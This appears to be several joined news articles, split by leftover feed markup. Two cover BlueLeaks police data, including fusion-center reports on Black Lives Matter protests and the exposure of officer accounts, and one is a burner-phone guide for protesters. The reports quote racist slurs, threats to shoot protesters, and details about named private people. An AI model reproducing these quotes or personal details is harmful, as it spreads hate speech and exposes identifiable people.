<p>The following day, NCRIC sent another bulk email announcing that an upcoming class would need to be postponed. “Due to operational needs necessitated by the protests in our [area of responsibility], the Chasing Phones class scheduled for June 3-4, 2020 has been rescheduled for June 17-18, 2020.”</p>
<p>According to a flyer, the Chasing Phones class “will explore the methods of exploiting a suspect’s cellular phone, phone company records, and third-party data sources records” and “will increase law enforcement officers’ awareness and appreciation of the evidence and intelligence located in a mobile device and provides students with the tools and training to prepare search warrants to legally obtain that evidence.” At the time the NCRIC data was exfiltrated, the class was scheduled to happen over Zoom, and 356 people had registered for it. But this training would have to wait; monitoring protests was higher priority.</p>

<h2>Black Lives Matter Protests as “Suspicious Activity”</h2>
<p>Local police connected to NCRIC used the intelligence hub to repeatedly flag BLM-related protests, vigils, and cultural events as suspicious. On May 31, a sergeant in the San Mateo County Sheriff’s Office posted a Suspicious Activity Report, or SAR, requesting “intel if any is observed regarding violent civil/criminal unrest in the county of San Mateo, specifically the cities of Redwood City, San Mateo and East Palo Alto,” adding, “It is believed that protests will occur this coming week in these cities &#8211; want intel as to #’s of participants and any illegal activities being transpired.”</p>
<p>Later that same day, another officer from San Mateo Sheriff’s Office posted another SAR about a local protest. “Peninsula Progressive Action Group holding a vigil/protest for George Floyd,” he wrote, referring to a local Bay Area <a href="https://ppagonline.org/">progressive citizens group</a>. “Requesting NCRIC intelligence gathering/monitoring of social media, etc. Although the event is promoted as peaceful, similar events in the region devolved into violence. Unknown attendance at this point. Agitators are known to promote suburban targets next.”</p>
<p>The next day, PPAG posted to its website that the planned vigil in San Carlos was <a href="https://ppagonline.org/2020/06/01/vigil-postponed-for-safety-concerns/">postponed</a> over to safety concerns, citing “right-wing extremists groups that are using events, particularly evening events, as an excuse to instigate violence and cause damage.” Even though the vigil was canceled, “about 100 people” <a href="https://ppagonline.org/2020/06/07/the-accidental-vigil/">showed up anyway</a> with masks and signs, according to a follow-up post.</p>
<p>On the night of June 2, 20-year-old San Jose hip-hop artist Simon Vertugo tweeted about an upcoming event called “The Black American Experience,” a “discussion on the Black experience and how we can take steps to prevent future civil injustice, police brutality and reform our judicial system,” to be held in a few days at the Olympic Black Power statue at San Jose State University.</p>

<p>After an officer with the university police department saw this tweet, he logged into NCRIC’s website and posted a SAR under the category “Radicalization/Extremism” with the event image from the tweet. “Possible meeting spot for protest activity at SJSU,” he wrote. “Has been seen on Twitter under the name @simonvertugo. Date is 6/6/20 at 1300 hours. Has been retweeted about 300 times. No data on possible attendance.”</p>
<p>Vertugo felt this was an example of police overreach. “Truthfully I think the university cops were completely overreacting to a speech being held on a college campus,” Vertugo told The Intercept. “Nobody was inciting any riots, no plans of breaking windows, destroying property. It was just a speech held by some Black kid and his peers. I think it’s a huge joke what they choose to focus on.” Nearly 300 people <a href="https://sjsunews.com/article/san-jose-residents-gather-at-sjsu-to-discuss-the-black-experience-in-america">showed up</a> at the speaking event.</p>
<p>Officers from San Benito County Sheriff’s Office and Novato Police Department also posted SARs of local protests they heard about. Local cops from across the region logged into NCRIC to request support related to upcoming protests in their cities, sometimes asking for social media monitoring. These police departments all posted support requests about Black Lives Matter protests to NCRIC:</p>
<ul>
<li>Walnut Creek Police Department</li>
<li>Sunnyvale Department of Public Safety</li>
<li>Antioch Police Department</li>
<li>Fremont Police Department</li>
<li>Napa Police Department</li>
<li>Healdsburg Police Department</li>
<li>Palo Alto Police Department</li>
<li>Golden Gate Bridge Patrol</li>
<li>Contra Costa College District</li>
</ul>
<p>A sergeant with the Oakland Police Department posted a support request asking for “analysts to monitor open source media to track crimes that are about to occur or have just occurred during the protest.” And an officer with the San Francisco Police Department posted an equipment request to NCRIC asking for surveillance cameras in “high volume locations.” “We have several more planned demo&#8217;s this week and these cameras would greatly enhance our situational awareness and public safety during these incidents,” she wrote.</p>
<p>Police were also paying close attention to any social media posts that mention looting, rioting, or violence against law enforcement. One SAR describes a Twitter user who tweeted, “Are we having a protest in Napa I low key wanna layout a cop.” Another describes a Twitter thread mentioning looting Target stores in Walnut Creek, Emeryville, and Bayfair. Another describes receiving a “threat via social media” threatening to loot stores at Sun Valley Mall in Concord. And another included a photograph of a phone displaying instructions for a “San Mateo County Looting Night” with a “hit list” of corporate chains.</p>
<p>On May 31, a paramedic at a gas station that rents U-Hauls in Napa said he “observed an estimated two dozen people dressed in black (hoodies, masks, shirts pants) in their twenties most white as far as he could tell, several of which were wearing masks,” with “another half dozen people wearing the same clothing” in the store, and he overheard them asking if they could rent vans for one day and leave them in San Francisco. He considered this suspicious behavior, so he called his off-duty friend in the fire department and said “they looked like a ‘ANTIF[A] or Black Bloc’ group.” His friend called the department’s Homeland Security operations officer, who posted this secondhand information as a SAR to NCRIC’s website.</p>
<p>And on June 2, a hardware store employee called the Novato Police Department to report that a woman “purchased all their helmets, hard hats, hammers, bolt cutters and goggles,” and that she mentioned the goggles were for tear gas. The Navato police officer posted this as a SAR, with a description of the woman and her vehicle.</p>
<h2>Threats Against Protesters’ Lives</h2>
<p>The large majority of civil unrest-related suspicious activity reports during this period were about Black Lives Matter protests, but a few were about people who believe that Black lives don’t matter.</p>
<p>A middle-aged white man called a California Constituent Affairs employee on June 2 and described his plans to shoot and kill protesters, according to a June 3 SAR posted by an officer with the California Highway Patrol. &#8220;The subject said he will shoot and kill protesters he perceives as a threat,” the employee described. “He believes all protesters are thugs, and says this has nothing to do with race. The subject said he has multiple firearms, including an AK 47 and he has no problem blowing off their heads if they get near his house, start a fire, or begin looting in his city. He said he will take actions into his own hands because politicians are not doing anything about it. He added that all his friends and neighbors have guns and are not afraid to use them. The subject made it very clear that protesters are not welcomed in his neighborhood and threatened to kill protesters.”</p>
<p>In another instance, the FBI’s threat operations center found a tweet that said, “Everyone please be careful out there! I don’t know if this person is genuine or fucking with me but I’d rather be safe than sorry! Apparently his businesses were looted and he is now threatening to shoot protesters.” It included a screenshot of a direct message conversation in which the alleged San Francisco business owner wrote, “I will start shootings tomorrow,” and “Anyone from this bullshit [enters] my store I’m gonna [shoot] them.”</p>

<p>On June 3, an officer at West Valley-Mission Community College Police Department posted a SAR that included a video from Snapchat, writing, “Subject has been reported as to have made a video of himself on [Snapchat] wearing a KKK style hood and [making] a white power hand gesture with the slogan ‘Burn crosses not buildings’ likely in response to the ongoing riots related to the George Floyd protests.”</p>
<h2>Protecting Racist Teenagers From Online Harassment</h2>
<p>“For ‘Black out Tuesday’, a 16 year old female changed her social media profile picture to all blue, in support of law enforcement, instead of all black, in support of Black Lives Matter,” a detective with the Walnut Creek Police Department typed into a Cyber Security Assessment request to NCRIC on June 4. “The family has been receiving death threats/property threats on social media, by phone and text.” He requested that they “search/review social media to obtain potential threats to family, as well as the identities of persons making such threats.”</p>
<p>The attached documents — a Microsoft Word document and a series of emails between Walnut Creek police officers — show much more than changing her avatar to blue to support law enforcement. They include screenshots of the teenager’s TikTok videos where she wrote messages like, “Tbh the kkk should come back. Oh and I wanna move to Georgia bc they have segregated proms,” and “I don’t talk to niggers.”</p>
<p>On June 6, a lieutenant with the Moraga Police Department posted a similar request to NCRIC. “The Moraga Police Department became aware of a video clip circulating on social media that depicts 3 Campolindo High School female teenagers using racist and offensive language, including the N-word,” he wrote. “We are requesting open source internet checks and overall social media monitoring analysis for the presence of threats, especially threats of violence or retaliation to occur in the Town of Moraga.”</p>
<p>When asked if it’s their policy to provide proactive protection to racists, the Walnut Creek and Moraga Police Departments did not respond to a request for comment.</p>
<p>“Any time there’s a potential threat where they’ll harm somebody, or someone’s indicating that they’ll harm somebody, we do support local agencies with those types of requests,” Sena, NCRIC’s executive director, said. “And we can’t base our support based on what the person says, or their ideologies. We have to treat everyone in the public the same, and our goal is to protect lives.”</p>
<h2>Cyber Attacks Against Law Enforcement</h2>
<p>In addition to sending bulk emails to thousands of local police, NCRIC sometimes sends bulk emails to its list of over 3,700 industry partners.</p>
<p>One June 2 mailing included a prescient warning from the FBI’s Cyber Division: “Due to ongoing civil unrest, hacktivist groups are actively threatening and endorsing cyber attacks against law enforcement and state government networks,” the FBI wrote. “Groups such as ‘Anonymous’ are actively leveraging societal and political unrest to encourage global cyber action against law enforcement and government computer networks, outward facing web pages, and social media accounts.”</p>
<p>Four days after NCRIC sent this email, the BlueLeaks hacktivist — who identified with Anonymous — began exfiltrating data from NCRIC’s server.</p>

                                        <content:encoded><![CDATA[<p><u>After failing to prevent</u> the terrorist attacks of September 11, 2001, the U.S. government realized it had an information sharing problem. Local, state and federal law enforcement agencies had their own separate surveillance databases that possibly could have prevented the attacks, but they didn’t communicate any of this information with each other. So Congress directed the newly formed Department of Homeland Security to form “fusion centers” across the country, collaborations between federal agencies like DHS and the FBI with state and local police departments, to share intelligence and prevent future terrorist attacks.</p>
<p>Yet in 2012 the Senate <a href="https://www.hsgac.senate.gov/imo/media/doc/10-3-2012%20PSI%20STAFF%20REPORT%20re%20FUSION%20CENTERS.2.pdf">found</a> that fusion centers have “not produced useful intelligence to support Federal counterterrorism efforts,” that the majority of the reports fusion centers produced had no connection to terrorism at all, and that the reports were low quality and often not about illegal activity. Fusion centers have also been criticized for privacy and civil liberties violations <a href="https://www.nytimes.com/2013/06/25/us/defendant-added-to-protesters-spying-suit.html?_r=0">such as</a> infiltrating and spying on anti-war activists.</p>
<p>Last month, the transparency collective Distributed Denial of Secrets published 269 gigabytes of law enforcement data on its website and using the peer-to-peer file sharing technology BitTorrent. The data, stolen from 251 different law enforcement websites by the hacktivist collective Anonymous, was mostly taken from fusion center websites (including many of those <a href="https://www.dhs.gov/fusion-center-locations-and-contact-information">listed</a> on DHS’s website), though some of the hacked websites were for local police departments, police training organizations, members-only associations for cops or retired FBI agents, and law enforcement groups specifically dedicated to investigating organized retail crime, drug trafficking, and working with industry.</p>

<p>After the BlueLeaks data was published, Twitter has permanently suspended the DDoSecrets Twitter account, citing a <a href="https://help.twitter.com/en/rules-and-policies/hacked-materials">policy</a> against distributing hacked material. Twitter has also taken the unprecedented step of blocking all links to ddosecrets.com, <a href="https://arstechnica.com/tech-policy/2020/06/twitter-terminates-ddosecrets-and-falsely-claims-it-may-infect-visitors/">falsely claiming</a>, to users who click that the website may be malicious. Twitter is implementing these policies arbitrarily; for example, the WikiLeaks Twitter account and links to wikileaks.org are still accessible despite the large amount of hacked material that WikiLeaks has published. Following Twitter’s example, Reddit <a href="https://www.washingtontimes.com/news/2020/jul/10/reddit-bans-forum-dedicated-to-blueleaks-data-dump/">banned</a> the r/blueleaks forum — citing its <a href="https://www.redditinc.com/policies/content-policy">policy</a> against posting personal information — where users discussed articles based on leaked documents and their own findings from digging through the BlueLeaks data. German authorities have <a href="https://slate.com/technology/2020/07/german-authorities-seized-a-server-containing-sensitive-police-data.html">seized</a> a server belonging to DDoSecrets that was hosting BlueLeaks data, leaving BitTorrent as the only way the data is currently being distributed by the organization. (For the record, I&#8217;m a member of DDoSecrets&#8217; advisory board.)</p>
<p>“I think the bans are simple attempts to slow or stop the spread of the information and news,” Emma Best, a co-founder of DDoSecrets, told The Intercept. “The fact that the server was seized without a warrant or judicial order and now sits idle while the Germans debate whether or not to let FBI have it simply emphasizes the conclusion that censorship and retaliation, not just investigation, are the driving forces,” they added.</p>

<p>All of the hacked websites were hosted and built by the Texas web development firm Netsential on Windows servers located in Houston. They were all running the same custom (and insecure) content management system, developed using Microsoft’s ASP.NET framework in the programming language VBScript, using Microsoft Access databases. Because they all run the same software, if a hacker could find a vulnerability in one of the websites that allowed them to download all the data from it, they could use that vulnerability to hack the rest of the websites without much additional effort.</p>
<p>The hacked data includes a massive trove of law enforcement documents, most of which dates from 2007 until June 14, 2020, <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2020/06/26/blueleaks-minneapolis-police-protest-fears/">well into</a> the wave of anti-police brutality protests triggered by the <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2020/05/29/george-floyd-minneapolis-police-reform/">police murder of George Floyd</a> in Minneapolis. The data also includes the source code for Netsential’s custom CMS — while analyzing it for this story, I discovered a vulnerability myself — and the content of the databases that these websites used.</p>
<p>“Netsential can confirm its web servers were recently compromised,” the company said in a statement on <a href="https://netsential.com/">its website</a>, which itself runs this same CMS. “We are working with the appropriate law enforcement authorities regarding the breach, and we are fully cooperating with the ongoing investigation. We have enhanced our systems and will continue to work with law enforcement to mitigate future threats. Netsential will continue to work with clients impacted by the intrusion. Inasmuch as this is an ongoing investigation, and due to the sensitivity of client information, Netsential will provide no further statement while the matter is pending.“</p>
<p>“It’s a disaster for law enforcement from a PR perspective,” Phillip Atiba Goff — CEO and co-founder of Center for Policing Equity, an organization that uses data science to combat racial bias within U.S. police departments — told me in an encrypted phone call. “That there is worse stuff than what we’re seeing, that it’s not just individual [police] Facebook accounts but it’s part of the culture of the department — that doesn’t surprise me. That shouldn’t surprise anyone.”</p>
<h3>700,000 Law Enforcement Officers Exposed</h3>
<p>The vast majority of people who have logins on these hacked websites are law enforcement officers, and Netsentiel’s CMS stores quite a lot of personal information about each account.</p>
<p>For example, the <a href="https://ncric.ca.gov/">Northern California Regional Intelligence Center</a> has 29,114 accounts, and each one includes a full name; rank; police department or agency; email address; home address,; cellphone number; supervisor’s name, rank, and email address; the IP address used to create the account; and a password hash — a cryptographic representation of the user’s password (hashed with 1,000 iterations of PBKDF2 and a 24-byte salt, if you’re that kind of nerd). If a user&#8217;s password is weak, hackers with access to its hash could crack it to recover the original password, potentially leading to a giant list of all the weak passwords used by U.S. law enforcement.</p>
<p>This is from a single fusion center. The BlueLeaks data contains similar information for 137 separate websites, though most have fewer accounts and not every website contains all of these pieces of information. Some don’t contain password hashes.</p>

<p>The two largest account databases come from the National Guard’s <a href="https://counterdrugtraining.com/">counterdrug training program</a> website, with more than 200,000 accounts exposed, and the Los Angeles <a href="https://lahidtatraining.org/">High Intensity Drug Trafficking Area training program</a> website with nearly 150,000 accounts exposed. In total, the hacked data includes private details for over 711,000 accounts.</p>
<p>“I get that there’s a community concern that there’s not accountability for law enforcement, and there’s a desire among a nontrivial portion of the population for something like not justice but vengeance, and there&#8217;s a feeling that the entire population of law enforcement is to blame for what we’ve seen in the streets,” Goff said. “I really pray that no officer is hurt because of this. Even more I pray that no officer&#8217;s family is hurt because of this.”</p>
<h3>Hacked Websites</h3>
<p>Many of the websites belonged to traditional fusion centers, such as Minnesota’s fusion center called <a href="https://icefishx.org/">ICEFISHX</a>, the <a href="https://alabamafusioncenter.org/">Alabama Fusion Center</a>, and even the <a href="https://mlrin.org/">Mariana Regional Fusion Center</a> based in the Mariana Islands, a U.S. commonwealth in the North Pacific.</p>
<p>But a number of the hacked websites belong to organizations in which law enforcement agencies partner with industry, such as:</p>
<ul>
<li><a href="https://energysecuritycouncil.org/">Energy Security Council</a>, a nonprofit where law enforcement collaborates with oil companies. Its board of directors includes executives from companies like Chevron and Exxon Mobil.</li>
<li><a href="https://chicagolandfsg.org/">Chicagoland Financial Security Group</a>, a “crime watch”-type website that Chicago law enforcement uses to communicate with the financial industry (presumably, white-collar crime isn’t included in their definition of “crime”). Partner organizations include Bank of America, Chase, U.S. Bank, and several other financial institutions.</li>
<li><a href="https://chicagoheat.org/">Chicago Hospitality Entertainment and Tourism Security Association</a> (Chicago HEAT), a nonprofit where the DHS, FBI, DEA, and Chicago Police collaborate with Illinois Hotel &amp; Lodging Association.</li>
<li><a href="http://leapsla.org/">Law Enforcement and Private Security Los Angeles</a>, which organized annual symposiums between law enforcement and private security companies.</li>
<li>Organized retail crime alliances (ORCAs), partnerships between law enforcement and local retail industries that investigate organized shoplifting rings. These include <a href="https://alertmidsouth.org/">Alert Mid-South</a> (Tennessee, Mississippi, Alabama), <a href="https://cal-orca.org/">CAL ORCA</a> (California), <a href="https://cnyorca.org/">Central New York ORCA</a>, and many others.</li>
</ul>
<p>Many of the hacked websites belong to high intensity drug trafficking area programs, or HIDTAs, essentially fusion centers focused solely on the war on drugs. These include <a href="https://www.achidta.org/">Atlanta-Carolinas HIDTA</a>, <a href="https://www.nmhidta.org/">New Mexico HIDTA</a>, <a href="https://www.prvihidta.org/">Puerto Rico-U.S. Virgin Islands HIDTA</a>, as well as many others.</p>
<p>Some of the hacked websites belong to local police departments, such as the <a href="https://jerseyvillagepd.org/">Jersey Village Police Department</a> in Texas, which prominently displays a link to request a “vacation house watch.” In this case, partners who log in to the website appear to be individuals who live or own property in Jersey Village. Websites belonging to the <a href="https://lupd.org/">Lamar University Police Department</a> (also in Texas), the <a href="https://burlingamepolice.info/">Burlingame Police Briefing Board</a> (in California), and several other local police departments were among those hacked.</p>
<p>Many of the hacked websites belonged to training academies for law enforcement, such as the <a href="https://ileatraining.org/">Iowa Law Enforcement Academy</a>, the <a href="https://acprlea.org/">Amarillo College Panhandle Regional Law Enforcement Academy</a>, and many others. The Los Angeles Police Department Detective Training Unit website, which was taken offline after the data breach, offers courses taught by billionaire Peter Thiel’s private surveillance company Palantir.</p>

<p>Finally, several of the hacked websites belong to members-only associations like the <a href="https://hproa.com/">Houston Police Retired Officers Association</a>, the <a href="https://semacp.org/">Southeastern Michigan Association Chiefs of Police</a>, and associations for various chapters of the FBI National Academy Associates.</p>
<h3>Suspicious Activity Reports</h3>
<p>A week after Derek Chauvin, a Minneapolis police officer, knelt on George Floyd’s neck for eight minutes while he lay handcuffed in the street until he died, triggering massive nationwide protests, a young political science major in Oregon was contacting lawyers. “I am a long time activist and ally of the Black Lives Matter movement,” she wrote to a Bay Area law firm. “Is there anyway[sic] that I could add your firm, or consenting lawyers under your firm, to a list of resources who will represent protesters pro bono if they were/are to be arrested? Thank you very much for your time.”</p>

<p>A lawyer who read this message was infuriated and anonymously reported the student to the authorities. “PLEASE SEE THE ATTACHED SOLICITATION I RECEIVED FROM AN ANTIFA TERRORIST WANTING MY HELP TO BAIL HER AND HER FRIENDS OUT OF JAIL, IF ARRESTED FOR RIOTING,” he typed into an unhinged letter, in all-caps, that he mailed to the Marin County District Attorney’s office, just north of San Francisco.</p>
<p>He explained that he was remaining anonymous because he “CANNOT RISK THIS PIECE OF SHIT ANTIFA [&#8230;] FILING A BAR COMPLAINT AGAINST ME,” and warned that “THE SAN FRANCISCO PUBLIC DEFENDERS WILL VIGOROUSLY DEFEND THESE TERRORISTS.” He ended his letter, “HAPPY HUNTING.”</p>

<p>An investigator in the Marin County DA’s office considered this useful intelligence. She logged into the Northern California Regional Intelligence Center’s CMS and created a new Suspicious Activity Report, or SAR, under the category “Radicalization/Extremism” and typed the student’s name as the subject. “The attached letter was received via US Postal Service this morning,” she wrote in the summary field. The student “appears to be a member of the Antifa group and is assisting in planning protesting efforts in the Bay Area despite living in Oregon.”</p>
<p>She uploaded a scanned PDF of the letter to the fusion center. The return address on the envelope was the address of the San Francisco District Attorney’s office. The Intercept could not confirm if the attorney who reported this student works with the San Francisco DA or not.</p>

For example, in June, Google reported a series of comments that a user from Michigan posted to different videos. Here is an example of one of his comments:</p>
<blockquote><p>He was only a nigger. Who cares. With the years of unprovoked anti white attacks and contribution to white genocide. I feel nothing for nigger deaths. Or view them as human. Way they act. Trump 2020 and why I still refuse to serve niggers in my diner to the point I have history of pointing my gun at any who still enter despite the sign outside. That includes ones in police uniform who could be fake cops in stolen uniforms. Would be like letting in the Devil.</p></blockquote>
<p>It’s unclear what the fusion center does with this information, if anything. But this SAR reported by Google is the only place in all of the BlueLeaks data where this YouTube user’s display name or email address appears.</p>
<h3>Scratching the Surface</h3>
<p>In all, the BlueLeaks archive contains more than 16 million rows of data from hundreds of thousands of hacked database tables: not just personal information of officers, but the content of bulk emails and newsletters, descriptions of alleged crimes with geolocation coordinates, internal survey results, website logs, and so much more. It also contains hundreds of thousands of PDFs and Microsoft Office documents, thousands of videos, and millions of images.</p>
<p>“I think that law enforcement can be better if [evidence of police crimes and racial bias] can be made more public,” Goff said. “The emails and records that I’ve seen could absolutely take down the entire profession.”</p>

                                        <content:encoded><![CDATA[<p><u>If you’re taking</u> to the streets to demand justice for the victims of police brutality and homicide, you may want to leave your phone at home. No matter how peaceful your behavior, you are at risk of getting arrested or assaulted by police. Cops might confiscate your phone and search it regardless of whether or not they’re legally allowed to, or they might try to break it, especially if it contains photos or video of their violent or illegal actions.</p>
<p>At the same time, it’s a good idea to bring a phone to a protest so you can record what’s happening and get the message out on social media. Filming police is completely legal and within your rights, and it’s one of the few tools citizens have against police brutality. It’s also important to be able to communicate with others in real time or to find your friends in case you get separated.</p>
<p class="p1"><!-- BLOCK(newsletter)[0](%7B%22componentName%22%3A%22NEWSLETTER%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%7D) --><div class="shortcode" data-shortcode="newsletter" data-campaign="" data-cta="" data-headline="" data-layout="" data-subhead=""></div><!-- END-BLOCK(newsletter)[0] --></p>
<p>To reconcile this tension — between wanting to protect your privacy and wanting to digitally document protests and police misdeeds — the safest option is to leave your primary phone, which contains a massive amount of private information about you, at home and instead bring a specially prepared burner phone to protests.</p>
<p>I discuss how to do this at length below, and in the video above.</p>
<h3>What if I Can’t Afford a Burner Phone?</h3>
<p>I bought a Nokia 1.3 smartphone for $99, as well as three months of prepaid phone service for $40. If this is too expensive for you, you may have other options:</p>
<ul>
<li>If you have an old phone collecting dust in a drawer, as long as it still works and the battery still holds a charge, you can use this as your burner phone rather than buying a new one. You just need a new <a href="https://en.wikipedia.org/wiki/SIM_card">SIM card</a>, like one that comes with prepaid cell service. Make sure to factory reset the phone before getting ready to protest.</li>
<li>There are even cheaper phones and prepaid service options than the ones I chose, and these can work fine as well.</li>
<li>If you want to avoid paying for phone service for your second phone, depending on your current cell phone provider and what types of phones you have, you may be able to remove the SIM card from your main phone and insert it into your burner phone, and then put it back after the protest. This will cause all calls and texts to temporarily go to your burner phone instead of your main one. You’ll want to make sure the SIM card slot on the second phone can accommodate the <a href="https://en.wikipedia.org/wiki/SIM_card#Formats">size of the SIM card</a> you have on your primary phone.</li>
</ul>
<p>If a separate burner phone still isn’t an option and you decide you need to bring your primary phone, here are some steps to take to make it safer and less likely for your private data to end up in the hands of the police:</p>
<ul>
<li>Disable fingerprint and face unlock, and instead require typing a passcode or password to unlock your phone. This makes it take longer to get into your phone, but it also makes it considerably harder for police to get in without your consent.</li>
<li>Make sure your passcode or password is not easily guessable. If you’re using a numeric passcode, it should be at least 6 digits, but longer is better.</li>
<li>Set up a SIM PIN, which prevents police from removing the SIM card from your phone and inserting it into another, which would allow them to take over your phone number. Here are <a href="https://support.apple.com/en-us/HT201529">iPhone instructions</a> and <a href="https://www.howtogeek.com/259360/how-to-set-up-sim-card-lock-for-a-more-secure-android-phone/">Android instructions</a> for doing this. If you set a SIM PIN, you’ll need to type it every time you reboot your phone in addition to your passcode.</li>
<li>If you’re using Android, make sure your phone’s storage is encrypted (all iPhones have encrypted storage). On most Android phones, you can look in the Settings app, under Security &gt; “Encrypt phone” to find phone encryption settings.</li>
<li>Disable every smartphone feature that isn’t necessary like Wi-Fi, Bluetooth, and location services. You can also keep your phone in airplane mode when you don’t need to use the network. This will make your phone leak less information that police can use to track you.</li>
</ul>

<p>There are additional tips for non-burner phones in a video I made with my colleague Lauren Feeney in 2017, &#8220;<a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2017/04/21/cybersecurity-for-the-people-how-to-protect-your-privacy-at-a-protest/">How to Protect Your Privacy at a Protest</a>.&#8221;</p>
<h3>Picking Out a Burner Phone</h3>
<p>The main criteria for picking out a cheap burner phone is cost, which means iPhones are out. You may be able to find an old or refurbished iPhone for around $200, but Android phones can do the job just as well for much less. It’s common for low-end Android phones to be riddled with security issues that never get fixed, so the next criteria is finding a phone that supports the latest security updates.</p>
<p>With this in mind, I settled on the <a href="https://www.nokia.com/phones/en_int/nokia-1-3">Nokia 1.3</a>, which I bought for $99 on Amazon. This phone was released in March 2020, and it comes with the latest version of Android (the <a href="https://www.android.com/versions/go-edition/">Go edition</a> for low-end devices). It seems to have a good battery life and a decent camera, which is about all that’s required for this phone.</p>
<p>I was also looking for a cheap prepaid phone plan and ended up choosing <a href="https://www.mintmobile.com/">Mint Mobile</a>. I ordered a SIM card that comes with 3 months of service, also on Amazon, for $40.</p>

<p>I’m using this phone and this phone service, but these steps should be similar no matter what model phone or phone service provider you go with.</p>
<h3>Using a Password Manager</h3>
<p>Everyone who is serious about digital security should be using a <a href="https://ssd.eff.org/en/module/creating-strong-passwords">password manager</a>. Password managers are apps that create and store passwords for you, allowing you to use strong, random passwords without needing to memorize them. All your passwords are saved in an encrypted vault, and you unlock them using a single <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2015/03/26/passphrases-can-memorize-attackers-cant-guess/">passphrase</a> that you do memorize.</p>
<p>The process of setting up this burner phone requires keeping track of a bunch of passwords, so if you’re not already using one, you should set one up first. Some good options are <a href="https://bitwarden.com/">Bitwarden</a>, <a href="https://keepassxc.org/">KeePassXC</a>, <a href="https://www.lastpass.com/">LastPass</a>, and <a href="https://1password.com/">1Password</a>.</p>
<p>When you’re setting up your burner phone, you’ll want to save the following information in your password manager:</p>
<ul>
<li>Username and password for prepaid mobile service account</li>
<li>Username and password for burner Google account</li>
<li>PIN for unlocking the phone</li>
<li>PIN for Signal</li>
<li>Any other PINs or login information related to your phone</li>
</ul>
<h3>Setting Up and Locking Down the Nokia 1.3 or Other Android Phone</h3>
<p>Watch the video for a complete tutorial on configuring the Nokia 1.3 to get ready to bring to a protest. Much of the advice applies to other up-to-date Android phones. The tutorial steps include:</p>
<ul>
<li>Inserting the prepaid Mint Mobile SIM card and activating cell phone service</li>
<li>Creating a burner Google account to go along with the burner phone</li>
<li>Installing system updates, and adjusting all of the Android settings to be as secure, and to leak as little data, as possible</li>
<li>Installing and configuring the Signal app, and adding the contacts you’ll need during the protest to the device in such a way that they don’t get uploaded to the cloud</li>
<li>Installing social media apps</li>
<li>Setting up Google Photos to automatically upload photos and videos to the cloud, so that you’ll be able to recover them from another device even if police confiscate or break your phone</li>
</ul>
<p>I also went to a Black Lives Matter protest in Oakland, California, to field test this burner phone. The video includes photos and footage that I took so you can see the quality of the camera.</p>

<h3>A Note About Anonymity</h3>
<p>If you carry a phone with you, you don’t have location privacy. Police are able to use devices called <a href="https://www.eff.org/pages/cell-site-simulatorsimsi-catchers">cell-site simulators</a>, also known as <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2016/09/12/long-secret-stingray-manuals-detail-how-police-can-spy-on-phones/">Stingrays</a> or <a href="https://www.vice.com/en_us/article/gy7qm9/how-i-made-imsi-catcher-cheap-amazon-github">IMSI-catchers</a>, to monitor and collect data from all phones at a protest. Additionally, telecom and tech companies collect their own vast location databases from phones, and this sort of data is not possible to anonymize.</p>

<p>Using a burner phone can help with this problem, especially if you leave it powered off or in airplane mode except when you need to use it. But if you actually want to make sure your burner phone isn’t connected to your identity in any way, you have to do a lot more work:</p>
<ul>
<li>You have to buy the phone and phone service in person using cash instead of online, and pick a carrier that allows you to activate service without asking for identification.</li>
<li>Whenever you need to use the internet — first on your computer to activate your phone service, and then on your burner phone to install updates and apps — you need to do so anonymously by using Tor Browser or a public Wi-Fi network that’s far from your home.</li>
<li>You should never have your primary phone and your burner phone powered on in the same place at the same time, and you should never power on your burner phone at your house.</li>
</ul>

<p>You also need to take additional steps to stay anonymous at a protest, such as wearing nondescript clothes, covering your face (you should be doing this anyway since we’re in the middle of a global coronavirus pandemic), covering tattoos, and making a plan to avoid license plate readers or using public transit cards that can track your movements.</p>
<p>Keeping yourself completely anonymous while using a burner phone for protests is outside the scope of this article. Instead, these steps present a middle ground where it’s more difficult, but not impossible, for police to learn your identity, and if they confiscate and search your burner phone, they’ll gain access to far less private information about your life, your friends, and your activism than if they had confiscated your primary phone.</p>
<h3>Before the Protest</h3>
<p>Each time you’re preparing to go to a protest, it’s important to know exactly what you’ll be bringing with you. Leave all electronics at home except for your burner phone: Don’t bring a laptop, a smartwatch (sorry, your steps won’t count), USB sticks, or anything else. And if you’re planning on using your burner phone to bring to different protests, make sure to delete all your photos and videos from the burner phone after copying them to another device, and to delete any Signal conversations from previous protests, before you head out.</p>
<p>It’s always safest to go to protests with a buddy or a group of friends. You should put the phone numbers of everyone you know who will be at the protest in your burner phone in case you need to contact them. If your friends are bringing burner phones of their own, put their burner numbers in your contacts.</p>
<p>You should also make sure you know who to call in case you get arrested. Protest organizers should provide attendees with a legal support phone number, often run by an organization like the <a href="https://www.nlg.org/">National Lawyers Guild</a>. You should write this phone number on your skin with a permanent marker. If you get arrested, the police will confiscate your phone so you won’t be able to look it up there. You’ll want to call this number from jail in order to get legal support.</p>
<p>And it’s important to keep in mind that the coronavirus pandemic is still ongoing. Make sure to bring a face mask and hand sanitizer, and attempt to social distance when you can to avoid spreading the virus. It’s also always a good idea to bring a bottle of water.</p>
<h3>During the Protest</h3>
<p>No matter what cops might tell you, it’s completely legal to film them in public. Filming the police is one of the few tools citizens have to force accountability on them. If it weren’t for people filming police brutality on their cellphones, we wouldn’t have nearly so much evidence of widespread systemic racism within American police forces.</p>
<p>It’s good to share photos and videos from protests on social media, but you should also be mindful of the wishes of other protesters. While you’re legally allowed to film anything in a public gathering, it’s respectful to ask permission before taking photos of people’s faces.</p>
<p>If you’re paying for enough mobile data, you may want to configure Google Photos to automatically upload all photos and videos you take to the cloud. This way if police confiscate or damage your phone during the protest, you’ll be able to log in to your burner Google account from another device to access your media later on. Be aware, however, that pictures in Google Photos are not encrypted, meaning Google will be able to provide them to authorities if subpoenaed.</p>
<h3>If You Get Arrested</h3>
